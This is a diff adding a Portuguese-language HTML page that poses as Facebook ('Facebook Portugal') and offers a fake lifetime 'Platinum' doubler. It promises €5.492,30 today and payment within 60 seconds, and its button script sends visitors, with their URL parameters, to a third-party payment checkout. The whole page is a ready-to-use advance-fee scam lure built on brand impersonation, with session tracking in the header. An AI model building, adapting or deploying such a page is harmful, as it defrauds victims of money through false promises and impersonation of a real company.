@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+
+<head>
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "wnj6nzjur9");
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Upgrade Platinum Facebook</title>
+    <link rel="stylesheet" href="/css/upsell-premium.css">
+</head>
+
+<body>
+    <div class="premium-container">
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/3840px-Facebook_Logo_%282019%29.svg.png" alt="Facebook" class="logo" style="height: 30px;">
+        </div>
+
+        <div class="badge">Nível Platinum Final</div>
+
+        <h1 class="title">A Sua Oferta Final: <span style="color: #1d1d1f;">Duplicador Vitalício</span></h1>
+
+        <div class="description">
+            Parabéns por chegar ao fim! Como prémio de persistência, libertámos o <strong>Multiplicador 2X Vitalício</strong>.
+        </div>
+
+        <div class="amount-box">
+            <div class="amount-label">TOTAL A RECEBER HOJE (COM 2X)</div>
+            <div class="amount-value" style="color: #1d1d1f; font-size: 42px;">€5.492,30</div>
+        </div>
+
+        <div class="description">
+            Ao ativar o Upgrade Platinum, o seu saldo total acumulado é <strong>DUPLICADO NA HORA</strong> para mais de cinco mil euros.
+        </div>
+
+        <button onclick="redirectToPayment()" class="cta-button pulse" style="background: #1d1d1f; box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);">
+            <span>DUPLICAR TUDO E CONCLUIR</span>
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path></svg>
+        </button>
+
+        <p class="footer-text">
+            © 2026 Facebook Portugal. O pagamento será enviado em 60 segundos após esta etapa.
+        </p>
+    </div>
+
+    <script>
+        function getUrlParams() {
+            const params = new URLSearchParams(window.location.search);
+            let paramsObject = {};
+            params.forEach((value, key) => {
+                paramsObject[key] = value;
+            });
+            return paramsObject;
+        }
+
+        function redirectToPayment() {
+            const params = new URLSearchParams(window.location.search);
+            const checkoutUrl = new URL('https://waymb.com/c?username=eduardotreonix&product=11');
+
+            params.forEach((value, key) => {
+                checkoutUrl.searchParams.set(key, value);
+            });
+
+            window.location.href = checkoutUrl.toString();
+        }
+    </script>
+</body>
+
+</html>
